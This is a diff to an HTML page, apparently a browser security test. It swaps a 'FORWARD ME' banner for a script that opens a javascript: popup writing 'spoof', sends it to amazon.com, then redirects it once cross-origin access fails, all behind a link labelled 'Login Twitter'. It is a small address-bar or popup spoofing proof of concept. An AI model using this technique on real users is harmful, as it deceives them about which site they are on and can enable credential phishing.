@@ -1,3 +1,13 @@
-<div id="layer1" style="width:198px; height:200px; position:absolute; left:39px; top:0px; z-index:1;">
-    <img src="http://www.alternativ-testing.fr/hand01_up.gif" width="26" height="32" border="0"><br><h1>FORWARD ME</h1>
-</div>
+
+<script>
+  function next() {
+         w.location.replace('http://www.google.com/csi');
+        }
+
+  function f() {
+    w = window.open("javascript:document.write('spoof');location='http://amazon.com'","new","width=500 height=500");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
+</script>
+
+<a href="#" onclick="f()">Login Twitter</a>
